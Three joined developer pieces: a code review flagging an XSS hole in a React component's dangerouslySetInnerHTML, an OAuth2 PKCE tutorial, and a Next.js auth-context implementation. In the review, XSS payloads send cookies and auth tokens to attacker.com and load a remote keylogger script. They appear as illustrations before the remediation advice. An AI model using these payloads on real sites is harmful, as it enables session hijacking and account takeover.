# Code Review: **Changes Requested** 🔴

---

## [EXECUTIVE SUMMARY]

**Severity: Critical — Stored/Reflected XSS Vector Confirmed**

This component contains a direct, unmitigated Cross-Site Scripting (XSS) vulnerability. The `dangerouslySetInnerHTML` prop is injecting unsanitized, untrusted input directly into the DOM. React's name for this prop is not hyperbole — it is a deliberate warning. As written, this code **should not ship to production under any circumstances.**

---

## [DETAILED ANALYSIS]

### 🔴 Vulnerability #1: Unsanitized `dangerouslySetInnerHTML` (OWASP A03:2021 – Injection)

```jsx
// ❌ CRITICAL: `bio` is treated as trusted HTML with zero validation
function Profile({ bio }) {
  return <div dangerouslySetInnerHTML={{ __html: bio }} />
}
```

**Attack surface:** Any user-controlled data flowing into `bio` can execute arbitrary JavaScript. A malicious actor simply needs to inject a payload such as:

```html
<!-- Payload examples that would execute immediately -->
<img src="x" onerror="fetch('https://attacker.com/steal?c='+document.cookie)" />
<script>new Image().src='https://attacker.com/?token='+localStorage.getItem('auth_token')</script>
<svg onload="document.body.appendChild(Object.assign(document.createElement('script'),{src:'https://attacker.com/keylogger.js'}))">
```

**Impact Assessment:**
- **Session hijacking** via cookie/token exfiltration
- **Credential harvesting** via DOM manipulation (fake login overlays)
- **Persistent malware delivery** if the payload is stored server-side
- **Full account takeover** in auth-token-based SPAs

---

### ✅ Remediation Option 1: Eliminate `dangerouslySetInnerHTML` (Preferred)

If you only need formatted text, **never use raw HTML injection**. Use structured data instead:

```jsx
// ✅ SAFE: Plain text rendering — XSS is impossible here.
// React escapes all string content by default.
function Profile({ bio }) {
  return <div>{bio}</div>;
}
```

---

### ✅ Remediation Option 2: Sanitize Before Injection (If Rich HTML Is a Hard Requirement)

If the product requirement genuinely demands rich HTML (e.g., bold, links), **sanitize server-side AND client-side** using a battle-tested library. Do **not** write your own sanitizer.

```bash
npm install dompurify
npm install --save-dev @types/dompurify  # for TypeScript projects
```

```jsx
import DOMPurify from 'dompurify';

// Configure a strict allowlist — deny by default, permit explicitly
const SANITIZER_CONFIG = {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
  ALLOWED_ATTR: ['href', 'title', 'rel'],
  // Force all links to be safe and non-exploitable
  FORCE_BODY: true,
};

// ✅ SAFER: Sanitized HTML with strict allowlist
function Profile({ bio }) {
  const sanitizedBio = DOMPurify.sanitize(bio, SANITIZER_CONFIG);

  return <div dangerouslySetInnerHTML={{ __html: sanitizedBio }} />;
}
```

> ⚠️ **Critical note on `href`:** Even with DOMPurify, validate anchor `href` values against a protocol allowlist. The `javascript:` URI scheme bypasses many sanitizers:

```jsx
// Add this post-sanitization hook to neutralize javascript: URIs
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    const href = node.getAttribute('href') || '';
    if (!/^https?:\/\//i.test(href)) {
      node.removeAttribute('href');
    }
    // Prevent tab-napping attacks on external links
    node.setAttribute('rel', 'noopener noreferrer');
    node.setAttribute('target', '_blank');
  }
});
```

---

### 🟡 Vulnerability #2: Missing PropTypes / Type Validation

```jsx
// ❌ No runtime type enforcement — non-string values cause silent failures
// An object or array passed as `bio` can produce unexpected behavior
function Profile({ bio }) { ... }
```

```jsx
// ✅ Enforce type contract at the component boundary
import PropTypes from 'prop-types';

Profile.propTypes = {
  bio: PropTypes.string.isRequired,
};

// Or with TypeScript (strongly preferred):
interface ProfileProps {
  bio: string;
}
function Profile({ bio }: ProfileProps) { ... }
```

---

### 🟡 Vulnerability #3: No Content Security Policy (CSP) Defense-in-Depth

Client-side sanitization is a **single layer**. If DOMPurify has a 0-day (it has had bypasses before), you have no fallback. Enforce a strict CSP header at the HTTP layer:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none';
```

This ensures that even if an XSS payload is injected, **inline script execution is blocked by the browser** as a hard stop.

---

## [EDGE CASES & RISKS]

| Scenario | Risk | Mitigation |
|---|---|---|
| Bio sourced from third-party API | High — you don't control their sanitization | Always sanitize at your trust boundary, regardless of source |
| DOMPurify SSR (Next.js/Node) | DOMPurify requires a DOM environment | Use `isomorphic-dompurify` or `sanitize-html` on the server |
| Markdown-to-HTML pipeline | Markdown parsers can produce unsafe HTML | Sanitize the **output** of the parser, not the raw markdown |
| Future developer removes sanitization | Silent regression to critical vuln | Add an automated test asserting XSS payloads are neutralized |

---

## [NEXT STEPS]

1. **Immediate:** Flag this component as blocked from merging. Add a failing CI lint rule using `eslint-plugin-react` — it will warn on `dangerouslySetInnerHTML` by default.
2. **Short-term:** Implement Remediation Option 1 or 2 above based on your product requirements. Option 1 is always preferable.
3. **Architectural:** Audit every other instance of `dangerouslySetInnerHTML` in the codebase. Run `grep -rn "dangerouslySetInnerHTML" ./src` immediately.
4. **Process:** Add an XSS payload suite to your component integration tests and a CSP to your HTTP response headers.
5. **Threat Model:** If `bio` originates from user-submitted content, treat it as **maximally hostile input** — assume it has already been compromised.

# Getting Started: OAuth2 Authentication Flow in React

---

## [EXECUTIVE SUMMARY]

**Document Type:** Developer Onboarding Tutorial
**Audience:** Frontend engineers with basic React knowledge
**Scope:** Authorization Code Flow with PKCE (the correct choice for SPAs — never use Implicit Flow in 2024)
**Estimated Completion Time:** 45–60 minutes
**Prerequisites:** Node.js ≥ 18, an existing React app (Vite or CRA), and credentials from your OAuth2 provider (client ID, authorization endpoint, token endpoint)

> **⚠️ Architecture Note:** This tutorial implements **Authorization Code Flow + PKCE** (RFC 7636). If your current implementation uses the Implicit Flow or stores tokens in `localStorage`, stop — this guide will also explain why that's a security liability.

---

## [DETAILED ANALYSIS / ACTIONABLE GUIDANCE]

### Step 1 — Install Dependencies

```bash
npm install oidc-client-ts react-oidc-context
```

| Package | Purpose |
|---|---|
| `oidc-client-ts` | Handles PKCE, token validation, and refresh logic |
| `react-oidc-context` | React context wrapper for clean component integration |

> **Why not roll your own?** OAuth2 has well-documented implementation pitfalls (state validation, token leakage, timing attacks). Use a vetted library.

---

### Step 2 — Configure Your OAuth2 Provider Settings

Create a dedicated configuration file. **Never hardcode secrets here** — your `client_secret` does not belong in a SPA. Public clients use PKCE instead.

```typescript
// src/auth/authConfig.ts

import { WebStorageStateStore } from "oidc-client-ts";

export const oidcConfig = {
  authority: "https://your-identity-provider.com",   // e.g., Auth0, Okta, Keycloak
  client_id: import.meta.env.VITE_OAUTH_CLIENT_ID,  // From .env, never hardcoded
  redirect_uri: `${window.location.origin}/auth/callback`,
  post_logout_redirect_uri: `${window.location.origin}/`,
  scope: "openid profile email",                     // Request only what you need
  response_type: "code",                             // Authorization Code Flow
  userStore: new WebStorageStateStore({ store: window.sessionStorage }),

  // PKCE is enabled by default in oidc-client-ts — verify this explicitly
  automaticSilentRenew: true,
  silent_redirect_uri: `${window.location.origin}/auth/silent-renew`,
};
```

**Your `.env` file:**
```bash
# .env.local  ← Git-ignored. NEVER commit this.
VITE_OAUTH_CLIENT_ID=your_client_id_here
```

> **`sessionStorage` vs. `localStorage`:** `sessionStorage` is scoped to the tab and doesn't persist across sessions, reducing XSS token theft exposure. For stricter security, consider in-memory storage — but you'll lose persistence on page refresh. Choose based on your threat model.

---

### Step 3 — Wrap Your App with the Auth Provider

```typescript
// src/main.tsx

import React from "react";
import ReactDOM from "react-dom/client";
import { AuthProvider } from "react-oidc-context";
import { oidcConfig } from "./auth/authConfig";
import App from "./App";

ReactDOM.createRoot(document.getElementById("root")!).render(
  <React.StrictMode>
    <AuthProvider
      {...oidcConfig}
      onSigninCallback={() => {
        // Clean the OAuth artifacts (code, state) from the URL after callback
        // Leaving these in the URL is both a security risk and a UX issue
        window.history.replaceState({}, document.title, window.location.pathname);
      }}
    >
      <App />
    </AuthProvider>
  </React.StrictMode>
);
```

---

### Step 4 — Create the Callback Route

Register `/auth/callback` in your router to handle the authorization server's redirect.

```typescript
// src/pages/AuthCallback.tsx

import { useEffect } from "react";
import { useAuth } from "react-oidc-context";
import { useNavigate } from "react-router-dom";

export const AuthCallback = () => {
  const auth = useAuth();
  const navigate = useNavigate();

  useEffect(() => {
    // The library processes the callback automatically.
    // Once the user is loaded, redirect to your protected area.
    if (auth.isAuthenticated) {
      navigate("/dashboard", { replace: true });
    }
    if (auth.error) {
      console.error("Auth callback error:", auth.error.message);
      navigate("/error", { replace: true });
    }
  }, [auth.isAuthenticated, auth.error, navigate]);

  return <p>Completing sign-in, please wait...</p>;
};
```

**Register the route in your router:**
```typescript
// src/App.tsx (router config excerpt)

import { AuthCallback } from "./pages/AuthCallback";

<Route path="/auth/callback" element={<AuthCallback />} />
<Route path="/auth/silent-renew" element={<SilentRenew />} /> // See Step 6
```

---

### Step 5 — Build the Protected Route Guard

```typescript
// src/auth/ProtectedRoute.tsx

import { useAuth } from "react-oidc-context";
import { Navigate, Outlet } from "react-router-dom";

export const ProtectedRoute = () => {
  const auth = useAuth();

  if (auth.isLoading) {
    return <div>Loading session...</div>; // Replace with your spinner component
  }

  if (auth.error) {
    // Surface the error type — "login_required" is expected, others may not be
    console.error(`Auth error [${auth.error.name}]:`, auth.error.message);
    return <Navigate to="/login" replace />;
  }

  if (!auth.isAuthenticated) {
    return <Navigate to="/login" replace />;
  }

  return <Outlet />;
};
```

**Apply the guard in your router:**
```typescript
<Route element={<ProtectedRoute />}>
  <Route path="/dashboard" element={<Dashboard />} />
  <Route path="/settings" element={<Settings />} />
</Route>
```

---

### Step 6 — Implement the Login / Logout UI

```typescript
// src/components/AuthControls.tsx

import { useAuth } from "react-oidc-context";

export const AuthControls = () => {
  const auth = useAuth();

  const handleLogin = () => {
    // signinRedirect() generates the PKCE code_verifier/code_challenge automatically
    auth.signinRedirect();
  };

  const handleLogout = () => {
    // clearStaleState removes orphaned session artifacts
    auth.removeUser();
    auth.signoutRedirect();
  };

  if (auth.isAuthenticated) {
    return (
      <div>
        <span>Welcome, {auth.user?.profile.name}</span>
        <button onClick={handleLogout}>Sign Out</button>
      </div>
    );
  }

  return <button onClick={handleLogin}>Sign In</button>;
};
```

---

### Step 7 — Silent Token Renewal (Background Refresh)

Create the silent renew page — this runs in a hidden `<iframe>` to refresh tokens without interrupting the user.

```typescript
// src/pages/SilentRenew.tsx

import { useEffect } from "react";
import { signinSilentCallback } from "oidc-client-ts";
import { oidcConfig } from "../auth/authConfig";

export const SilentRenew = () => {
  useEffect(() => {
    signinSilentCallback(oidcConfig).catch(console.error);
  }, []);

  return null; // This page renders nothing visible
};
```

> ⚠️ Some providers (e.g., Auth0) **block silent renew via iframe** due to `X-Frame-Options` / cookie `SameSite=None` restrictions. In that case, use **Refresh Tokens with Rotation** instead — configure `offline_access` in your scopes and handle `signinSilent()` via the refresh token grant.

---

### Step 8 — Attach the Access Token to API Requests

```typescript
// src/api/apiClient.ts

import axios from "axios";
import { User } from "oidc-client-ts";
import { oidcConfig } from "../auth/authConfig";

// Retrieve the current user from storage without React context
function getUser(): User | null {
  const oidcStorage = sessionStorage.getItem(
    `oidc.user:${oidcConfig.authority}:${oidcConfig.client_id}`
  );
  if (!oidcStorage) return null;
  return User.fromStorageString(oidcStorage);
}

const apiClient = axios.create({
  baseURL: import.meta.env.VITE_API_BASE_URL,
});

apiClient.interceptors.request.use((config) => {
  const user = getUser();
  if (user?.access_token) {
    config.headers.Authorization = `Bearer ${user.access_token}`;
  }
  return config;
});

export default apiClient;
```

---

## [EDGE CASES & RISKS]

| Risk | Mitigation |
|---|---|
| **XSS token theft** | Use `sessionStorage` or in-memory storage; implement a strict Content Security Policy (CSP) |
| **CSRF on callback** | PKCE `state` parameter is validated automatically by `oidc-client-ts` — do not disable this |
| **Token not refreshing** | Verify `automaticSilentRenew: true` and that your silent renew URI is registered with the provider |
| **Stale sessions after logout** | Always call `signoutRedirect()` — `removeUser()` alone only clears local state, not the provider session |
| **Expired token sent to API** | Add a response interceptor to handle 401s and trigger `signinSilent()` before retrying |
| **Auth loop on callback failure** | The `onSigninCallback` handler must always clean the URL, even on error, to prevent redirect loops |
| **Scope creep** | Only request the scopes your app actively uses — principle of least privilege |

---

## [NEXT STEPS / ESCALATION]

**Immediate next actions:**

1. ✅ Register `redirect_uri` and `silent_redirect_uri` in your OAuth2 provider's allowed URIs dashboard
2. ✅ Confirm your provider returns a `code` (not a `token`) at the redirect — verifies Code Flow is active
3. ✅ Open DevTools → Application → Storage and confirm tokens are **not** landing in `localStorage`
4. ✅ Run a PKCE verification test using [oauth.tools](https://oauth.tools) against your provider
5. ✅ Add a `401` response interceptor to `apiClient` for seamless token refresh on expiry
6. ✅ Schedule a security review before deploying to production — have your CSP headers audited

**If you hit a wall:**
- Provider returning `invalid_grant`? → Clock skew between client/server, or the `code` was already consumed (it's single-use)
- Silent renew silently failing? → Check browser console for iframe CSP violations or cookie `SameSite` issues
- User getting logged out on refresh? → You're likely using in-memory storage without a refresh token fallback

---

*This documentation reflects RFC 6749, RFC 7636 (PKCE), and current OWASP recommendations for OAuth2 in browser-based applications (2024).*

## Code Review: Changes Requested → Senior Software Engineer: Implementation Brief

This is a well-trodden but frequently botched pattern. The core tension here is **synchronous localStorage reads vs. Next.js's server-side rendering pipeline** — get this wrong and you'll ship hydration errors, security gaps, or stale state bugs. Let me build this out properly.

---

## [EXECUTIVE SUMMARY / STATUS]

**Assessment:** Standard implementation attempts fail at three points:
1. Reading `localStorage` during SSR (it doesn't exist on the server)
2. Hydration mismatch from server rendering `null` state vs. client rendering persisted state
3. No token validation on rehydration — stale/expired tokens get trusted blindly

The solution uses a **deferred initialization pattern** with `useEffect` for client-side rehydration, a loading gate to prevent premature renders, and structured token validation before trusting persisted state.

---

## [DETAILED ANALYSIS / ACTIONABLE GUIDANCE]

### File Structure
```
src/
├── context/
│   ├── AuthContext.tsx          # Context definition + provider
│   └── auth.types.ts            # Shared types
├── hooks/
│   └── useAuth.ts               # Consumer hook
└── components/
    └── AuthGuard.tsx            # Route protection component
```

---

### `auth.types.ts`
```typescript
export interface AuthUser {
  id: string;
  email: string;
  roles: string[];
  displayName: string;
}

export interface AuthTokenPayload {
  sub: string;
  exp: number;        // Unix timestamp
  iat: number;
  email: string;
  roles: string[];
  displayName: string;
}

export interface AuthState {
  user: AuthUser | null;
  token: string | null;
  isAuthenticated: boolean;
  isLoading: boolean;         // True during SSR → client rehydration window
}

export interface AuthContextValue extends AuthState {
  login: (token: string) => Promise<void>;
  logout: () => void;
  refreshUser: () => Promise<void>;
}
```

---

### `AuthContext.tsx`
```typescript
'use client'; // Required for Next.js App Router

import React, {
  createContext,
  useCallback,
  useEffect,
  useMemo,
  useReducer,
} from 'react';
import type { AuthContextValue, AuthState, AuthTokenPayload, AuthUser } from './auth.types';

// ─── Constants ────────────────────────────────────────────────────────────────

const STORAGE_KEY = 'auth_token';
const TOKEN_EXPIRY_BUFFER_MS = 60_000; // Reject tokens expiring within 60s

// ─── Token Utilities ──────────────────────────────────────────────────────────

/**
 * Decodes and validates a JWT payload WITHOUT cryptographic verification.
 * Signature verification MUST happen server-side. This is purely for reading
 * claims and checking expiry on the client.
 */
function decodeTokenPayload(token: string): AuthTokenPayload | null {
  try {
    const parts = token.split('.');
    if (parts.length !== 3) return null;

    // Base64url → Base64 → JSON
    const base64 = parts[1].replace(/-/g, '+').replace(/_/g, '/');
    const jsonStr = atob(base64);
    const payload = JSON.parse(jsonStr) as AuthTokenPayload;

    // Structural validation — never trust shape alone
    if (
      typeof payload.sub !== 'string' ||
      typeof payload.exp !== 'number' ||
      typeof payload.email !== 'string' ||
      !Array.isArray(payload.roles)
    ) {
      return null;
    }

    return payload;
  } catch {
    return null;
  }
}

function isTokenValid(token: string): boolean {
  const payload = decodeTokenPayload(token);
  if (!payload) return false;

  const nowMs = Date.now();
  const expiryMs = payload.exp * 1000;

  return expiryMs - nowMs > TOKEN_EXPIRY_BUFFER_MS;
}

function tokenToUser(token: string): AuthUser | null {
  const payload = decodeTokenPayload(token);
  if (!payload) return null;

  return {
    id: payload.sub,
    email: payload.email,
    roles: payload.roles,
    displayName: payload.displayName,
  };
}

// ─── localStorage Utilities ───────────────────────────────────────────────────

/**
 * Guarded localStorage accessors. localStorage is unavailable in SSR context
 * and can throw in private browsing modes with storage quotas exceeded.
 */
const storage = {
  get: (): string | null => {
    try {
      return localStorage.getItem(STORAGE_KEY);
    } catch {
      return null;
    }
  },
  set: (token: string): void => {
    try {
      localStorage.setItem(STORAGE_KEY, token);
    } catch {
      console.warn('[Auth] Failed to persist token to localStorage.');
    }
  },
  clear: (): void => {
    try {
      localStorage.removeItem(STORAGE_KEY);
    } catch {
      // Non-fatal; session will still be cleared in-memory
    }
  },
};

// ─── Reducer ──────────────────────────────────────────────────────────────────

type AuthAction =
  | { type: 'REHYDRATE'; token: string; user: AuthUser }
  | { type: 'REHYDRATE_EMPTY' }
  | { type: 'LOGIN'; token: string; user: AuthUser }
  | { type: 'LOGOUT' };

const initialState: AuthState = {
  user: null,
  token: null,
  isAuthenticated: false,
  isLoading: true, // Starts true — we don't know the auth state until client runs
};

function authReducer(state: AuthState, action: AuthAction): AuthState {
  switch (action.type) {
    case 'REHYDRATE':
      return {
        user: action.user,
        token: action.token,
        isAuthenticated: true,
        isLoading: false,
      };
    case 'REHYDRATE_EMPTY':
      return {
        ...state,
        user: null,
        token: null,
        isAuthenticated: false,
        isLoading: false,
      };
    case 'LOGIN':
      return {
        user: action.user,
        token: action.token,
        isAuthenticated: true,
        isLoading: false,
      };
    case 'LOGOUT':
      return {
        user: null,
        token: null,
        isAuthenticated: false,
        isLoading: false,
      };
    default:
      return state;
  }
}

// ─── Context ──────────────────────────────────────────────────────────────────

export const AuthContext = createContext<AuthContextValue | null>(null);

// ─── Provider ─────────────────────────────────────────────────────────────────

interface AuthProviderProps {
  children: React.ReactNode;
}

export function AuthProvider({ children }: AuthProviderProps) {
  const [state, dispatch] = useReducer(authReducer, initialState);

  /**
   * REHYDRATION: Runs only on the client, after first paint.
   * This is the critical gate that prevents SSR/CSR hydration mismatches.
   * The server always renders with isLoading: true + no user, the client
   * then immediately corrects state before the user perceives it.
   */
  useEffect(() => {
    const storedToken = storage.get();

    if (storedToken && isTokenValid(storedToken)) {
      const user = tokenToUser(storedToken);
      if (user) {
        dispatch({ type: 'REHYDRATE', token: storedToken, user });
        return;
      }
    }

    // Token absent, invalid, expired, or malformed — clean slate
    storage.clear();
    dispatch({ type: 'REHYDRATE_EMPTY' });
  }, []);

  /**
   * Cross-tab sync: If user logs out in another tab, this tab should respond.
   */
  useEffect(() => {
    const handleStorageEvent = (event: StorageEvent) => {
      if (event.key !== STORAGE_KEY) return;

      if (!event.newValue) {
        // Token was removed in another tab
        dispatch({ type: 'LOGOUT' });
      } else if (event.newValue && isTokenValid(event.newValue)) {
        // Token was set/refreshed in another tab
        const user = tokenToUser(event.newValue);
        if (user) {
          dispatch({ type: 'REHYDRATE', token: event.newValue, user });
        }
      }
    };

    window.addEventListener('storage', handleStorageEvent);
    return () => window.removeEventListener('storage', handleStorageEvent);
  }, []);

  const login = useCallback(async (token: string): Promise<void> => {
    if (!isTokenValid(token)) {
      throw new Error('Attempted to login with an invalid or expired token.');
    }

    const user = tokenToUser(token);
    if (!user) {
      throw new Error('Token payload is malformed; cannot extract user.');
    }

    storage.set(token);
    dispatch({ type: 'LOGIN', token, user });
  }, []);

  const logout = useCallback((): void => {
    storage.clear();
    dispatch({ type: 'LOGOUT' });
    // Optionally: call your backend /auth/logout endpoint here to
    // invalidate the token server-side (critical for production)
  }, []);

  /**
   * Re-validates the current stored token. Use this after a token refresh
   * or when returning from a background state.
   */
  const refreshUser = useCallback(async (): Promise<void> => {
    const storedToken = storage.get();

    if (!storedToken || !isTokenValid(storedToken)) {
      storage.clear();
      dispatch({ type: 'LOGOUT' });
      return;
    }

    const user = tokenToUser(storedToken);
    if (user) {
      dispatch({ type: 'REHYDRATE', token: storedToken, user });
    }
  }, []);

  // Memoize the full context value to prevent unnecessary re-renders
  // of every consumer on each parent render cycle
  const contextValue = useMemo<AuthContextValue>(
    () => ({
      ...state,
      login,
      logout,
      refreshUser,
    }),
    [state, login, logout, refreshUser]
  );

  return (
    <AuthContext.Provider value={contextValue}>
      {children}
    </AuthContext.Provider>
  );
}
